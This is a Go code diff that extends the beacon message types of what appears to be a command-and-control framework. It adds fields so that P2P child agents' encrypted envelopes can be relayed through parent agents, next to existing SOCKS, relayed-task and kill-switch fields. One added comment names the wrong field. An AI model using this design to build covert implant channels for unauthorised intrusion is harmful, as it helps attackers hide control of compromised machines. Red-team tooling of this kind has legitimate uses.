@@ -34,6 +34,10 @@ type BeaconRequest struct {
 	TaskCapacity    *int              `json:"task_capacity,omitempty"`
 	SocksData       []SocksFrame      `json:"socks_data,omitempty"`
 	Relayed         []RelayedData     `json:"relayed,omitempty"`
+	// RelayedFrames carries opaque v2 beacon envelopes from P2P children. The
+	// parent never inspects or decrypts them: the envelope is authenticated
+	// end-to-end against the server with the child's own session key.
+	RelayedFrames []RelayedFrame `json:"relayed_frames,omitempty"`
 
 	ECDHPub   string `json:"ecdh_pub,omitempty"`
 	CipherB64 string `json:"c,omitempty"`
@@ -48,6 +52,15 @@ type RelayedData struct {
 	AgentID    string       `json:"agent_id"`
 	Results    []TaskResult `json:"results"`
 	AckTaskIDs []uint       `json:"acks,omitempty"`
+}
+
+// RelayedFrame is an opaque v2 beacon envelope sent by a P2P child and
+// forwarded verbatim by its parent. The Envelope field is the raw JSON
+// envelope bytes (base64-encoded by encoding/json). The parent does not
+// decrypt it; the server authenticates it with the child's session key.
+type RelayedFrame struct {
+	AgentID  string `json:"agent_id"`
+	Envelope []byte `json:"envelope"`
 }
 
 // TaskResult is the result output from a completed agent task.
@@ -80,6 +93,9 @@ type BeaconResponse struct {
 	SocksFrames     []SocksFrame  `json:"socks_frames,omitempty"`
 	SocksFastMode   bool          `json:"socks_fast,omitempty"`
 	Relayed         []RelayedTask `json:"relayed,omitempty"`
+	// RelayedFrames carries opaque response envelopes destined for P2P children.
+	// The parent forwards each envelope verbatim to the matching child.
+	RelayedReplies []RelayedReply `json:"relayed_replies,omitempty"`
 	ExtC2Data       []string      `json:"extc2_data,omitempty"`
 
 	// Fleet kill-switch broadcast (set only while armed): KillSwitch is the
@@ -97,6 +113,13 @@ type BeaconResponse struct {
 type RelayedTask struct {
 	AgentID string `json:"agent_id"`
 	Tasks   []Task `json:"tasks"`
+}
+
+// RelayedReply is an opaque v2 response envelope built by the server for a
+// P2P child. The parent forwards it verbatim over the child's channel.
+type RelayedReply struct {
+	AgentID  string `json:"agent_id"`
+	Envelope []byte `json:"envelope"`
 }
 
 // Task is a command or operation dispatched to an agent.
